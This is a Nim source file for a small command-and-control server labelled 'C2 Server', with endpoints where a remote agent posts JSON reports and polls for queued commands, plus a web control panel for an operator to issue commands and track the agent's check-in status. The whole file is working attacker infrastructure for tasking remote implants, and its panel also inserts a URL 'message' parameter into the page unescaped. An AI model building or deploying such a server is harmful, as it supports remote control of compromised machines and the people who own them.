import asynchttpserver, asyncdispatch, json, strtabs, times, options, uri, tables, strutils

proc main() =
  var latestReport: JsonNode = nil
  var commandToRun: string = ""
  var lastCheckin: Option[DateTime] = none(DateTime)
  var reportTimestamp: Option[DateTime] = none(DateTime)

  proc parseUrlEncoded(body: string): Table[string, string] =
    result = initTable[string, string]()
    for pair in body.split('&'):
      let parts = pair.split('=', 1)
      if parts.len == 2:
        result[decodeUrl(parts[0])] = decodeUrl(parts[1])
      elif parts.len == 1:
        result[decodeUrl(parts[0])] = ""

  proc onRequest(req: Request) {.async, closure, gcsafe.} =
    case req.url.path
    of "/report":
      if req.reqMethod == HttpPost:
        if req.body.len > 0:
          try:
            latestReport = parseJson(req.body)
            lastCheckin = some(now())
            reportTimestamp = some(now())
            await req.respond(Http200, "Report received")
          except JsonParsingError:
            await req.respond(Http400, "Invalid JSON")
        else:
          await req.respond(Http400, "Empty body")
      else:
        await req.respond(Http405, "Method Not Allowed")

    of "/command":
      if req.reqMethod == HttpGet:
        if commandToRun.len > 0:
          let cmd = commandToRun
          commandToRun = "" # Clear command after sending
          await req.respond(Http200, cmd)
        else:
          await req.respond(Http200, "idle")
      else:
        await req.respond(Http405, "Method Not Allowed")

    of "/submit_command":
      if req.reqMethod == HttpPost:
        let formData = parseUrlEncoded(req.body)
        commandToRun = formData.getOrDefault("command", "")
        echo "Received command from web UI: ", commandToRun
        let message = "Command '" & commandToRun & "' queued."
        await req.respond(Http303, "", newHttpHeaders({"Location": "/?message=" & encodeUrl(message)}))
      else:
        await req.respond(Http405, "Method Not Allowed")

    of "/":
      var body = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 Server</title>
    <style>
        body { font-family: sans-serif; background: #282c34; color: #abb2bf; }
        .container { max-width: 800px; margin: auto; padding: 20px; }
        h1, h2 { color: #61afef; }
        pre { background: #21252b; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
        form { margin-top: 20px; }
        input[type="text"] { width: 70%; padding: 8px; }
        input[type="submit"] { padding: 8px 15px; }
        .status { color: #98c379; }
        .status.offline { color: #e06c75; }
        .notification { background: #3a3f4b; border-left: 5px solid #61afef; padding: 15px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>C2 Control Panel</h1>
"""
      let queryParams = parseUrlEncoded(req.url.query)
      if queryParams.contains("message"):
        body &= "<div class='notification'>" & queryParams["message"] & "</div>"

      if lastCheckin.isNone():
        body &= "<h2 class='status offline'>Agent Status: OFFLINE</h2>"
      else:
        let timeSinceCheckin = now() - lastCheckin.get()
        if timeSinceCheckin.inSeconds > 30:
          body &= "<h2 class='status offline'>Agent Status: OFFLINE (Last check-in: " & $timeSinceCheckin.inSeconds & "s ago)</h2>"
        else:
          body &= "<h2 class='status'>Agent Status: ONLINE (Last check-in: " & $timeSinceCheckin.inSeconds & "s ago)</h2>"


      body &= """
        <h2>Send Command</h2>
        <form action="/submit_command" method="post">
            <input type="text" name="command" placeholder="e.g., rescan, sleep 15, exit" required>
            <input type="submit" value="Send">
        </form>
        <h2>Last Report</h2>
"""
      if latestReport != nil:
        body &= "<p>Received at: " & $reportTimestamp.get() & "</p>"
        body &= "<pre>" & pretty(latestReport) & "</pre>"
      else:
        body &= "<p>No report received yet.</p>"

      body &= """
    </div>
</body>
</html>
"""
      await req.respond(Http200, body, newHttpHeaders({"Content-Type": "text/html; charset=utf-8"}))

    else:
      await req.respond(Http404, "Not Found")

  var server = newAsyncHttpServer()
  echo "Starting C2 server on http://localhost:8080"
  waitFor server.serve(Port(8080), onRequest)

main()
